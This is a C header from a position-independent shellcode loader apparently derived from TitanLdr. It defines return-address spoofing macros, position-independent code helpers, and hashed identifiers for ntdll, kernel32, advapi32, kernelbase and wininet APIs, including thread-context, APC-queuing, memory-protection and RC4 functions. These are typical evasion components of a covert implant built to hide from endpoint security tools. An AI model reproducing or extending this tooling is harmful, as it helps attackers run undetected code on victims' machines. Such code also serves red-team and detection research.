//
// https://stackoverflow.com/questions/3046889/optional-parameters-with-c-macros
// https://github.com/SecIdiot/TitanLdr/blob/master/Macros.h
//

#pragma once

#include <windows.h>
#include <wininet.h>
#include <windns.h>
#include <ntstatus.h>
#include "native.h"


#define SPOOF_X( function, module, size )                             SpoofRetAddr( function, module, size, NULL, NULL, NULL, NULL, NULL, NULL, NULL )
#define SPOOF_A( function, module, size, a )                          SpoofRetAddr( function, module, size, a, NULL, NULL, NULL, NULL, NULL, NULL, NULL )
#define SPOOF_B( function, module, size, a, b )                       SpoofRetAddr( function, module, size, a, b, NULL, NULL, NULL, NULL, NULL, NULL )
#define SPOOF_C( function, module, size, a, b, c )                    SpoofRetAddr( function, module, size, a, b, c, NULL, NULL, NULL, NULL, NULL )
#define SPOOF_D( function, module, size, a, b, c, d )                 SpoofRetAddr( function, module, size, a, b, c, d, NULL, NULL, NULL, NULL )
#define SPOOF_E( function, module, size, a, b, c, d, e )              SpoofRetAddr( function, module, size, a, b, c, d, e, NULL, NULL, NULL )
#define SPOOF_F( function, module, size, a, b, c, d, e, f )           SpoofRetAddr( function, module, size, a, b, c, d, e, f, NULL, NULL )
#define SPOOF_G( function, module, size, a, b, c, d, e, f, g )        SpoofRetAddr( function, module, size, a, b, c, d, e, f, g, NULL )
#define SPOOF_H( function, module, size, a, b, c, d, e, f, g, h )     SpoofRetAddr( function, module, size, a, b, c, d, e, f, g, h )
#define SETUP_ARGS(arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10, arg11, arg12, ...) arg12
#define SPOOF_MACRO_CHOOSER(...) SETUP_ARGS(__VA_ARGS__, SPOOF_H, SPOOF_G, SPOOF_F, SPOOF_E, SPOOF_D, SPOOF_C, SPOOF_B, SPOOF_A, SPOOF_X, )
#define SPOOF(...) SPOOF_MACRO_CHOOSER(__VA_ARGS__)(__VA_ARGS__)

#define OFFSET( x )    ( ULONG_PTR )( GetIp( ) - ( ( ULONG_PTR ) & GetIp - ( ULONG_PTR ) x ) )
#define SECTION( x )    __attribute__(( section( ".text$" #x ) ))

#define D_API( x )    __typeof__( x ) * x
#define U_PTR( x )    ( ( ULONG_PTR ) x )
#define C_PTR( x )    ( ( PVOID ) x )
#define G_END( x )    U_PTR( GetIp( ) + 11 )


typedef struct __attribute__(( packed ))
{
    ULONG_PTR Region;
    ULONG_PTR Size;
    HANDLE    Heap;
} STUB, *PSTUB ;

static ULONG_PTR Start( VOID );
static ULONG_PTR GetIp( VOID );
static ULONG_PTR Stub( VOID );
static ULONG_PTR Spoof( VOID );


#include "util.h"
#include "retaddr.h"
#include "hooks/hooks.h"

// Modules
#define H_LIB_NTDLL                                 0x1edab0ed
#define H_LIB_ADVAPI32                              0x64bb3129
#define H_LIB_KERNEL32                              0x6ddb9555
#define H_LIB_KERNELBASE                            0x03ebb38b
#define H_LIB_WININET                               0x5cdbcb2d

// ntdll.dll
#define H_API_LDRGETPROCEDUREADDRESS                0xfce76bb6
#define H_API_LDRLOADDLL                            0x9e456a43
#define H_API_LDRUNLOADDLL                          0xd995c1e6
#define H_API_NTALERTRESUMETHREAD                   0x5ba11e28
#define H_API_NTALLOCATEVIRTUALMEMORY               0xf783b8ec
#define H_API_NTCLOSE                               0x40d6e69d
#define H_API_NTCONTINUE                            0xfc3a6c2c
#define H_API_NTCREATEEVENT                         0x28d3233d
#define H_API_NTCREATETHREADEX                      0xaf18cfb0
#define H_API_NTGETCONTEXTTHREAD                    0x6d22f884
#define H_API_NTGETNEXTTHREAD                       0xa410fb9e
#define H_API_NTOPENTHREAD                          0x968e0cb1
#define H_API_NTPROTECTVIRTUALMEMORY                0x50e92888
#define H_API_NTQUERYINFORMATIONPROCESS             0x8cdc5dc2
#define H_API_NTQUERYINFORMATIONTHREAD              0xf5a0461b
#define H_API_NTQUEUEAPCTHREAD                      0x0a6664b8
#define H_API_NTRESUMETHREAD                        0x5a4bc3d0
#define H_API_NTSETCONTEXTTHREAD                    0xffa0bf10
#define H_API_NTSIGNALANDWAITFORSINGLEOBJECT        0x78983aed
#define H_API_NTSUSPENDTHREAD                       0xe43d93e1
#define H_API_NTTERMINATETHREAD                     0xccf58808
#define H_API_NTTESTALERT                           0x858a32df
#define H_API_NTWAITFORSINGLEOBJECT                 0xe8ac0c3c
#define H_API_NTWRITEVIRTUALMEMORY                  0xc3170192
#define H_API_RTLALLOCATEHEAP                       0x3be94c5a
#define H_API_RTLANSISTRINGTOUNICODESTRING          0x6c606cba
#define H_API_RTLCREATEHEAP                         0xe1af6849
#define H_API_RTLCREATEUSERTHREAD                   0x6c827322
#define H_API_RTLEXITUSERTHREAD                     0x2f6db5e8
#define H_API_RTLFREEHEAP                           0x73a9e4d7
#define H_API_RTLFREEUNICODESTRING                  0x61b88f97
#define H_API_RTLINITANSISTRING                     0xa0c8436d
#define H_API_RTLINITUNICODESTRING                  0xef52b589
#define H_API_RTLUSERTHREADSTART                    0x353797c
#define H_API_RTLRANDOMEX                           0x7f1224f5
#define H_API_RTLWALKHEAP                           0x182bae64

// advapi32.dll
#define H_API_SYSTEMFUNCTION032                     0xe58c8805

// kernel32.dll
#define H_API_GETPROCESSHEAP                        0x36c007a2
#define H_API_HEAPALLOC                             0xadc4062e
#define H_API_SLEEP                                 0xe07cd7e
#define H_API_WAITFORSINGLEOBJECTEX                 0x512e1b97

// kernelbase.dll
#define H_API_SETPROCESSVALIDCALLTARGETS            0x647d9236

// wininet.dll
#define H_API_INTERNETCONNECTA                      0xc058d7b9
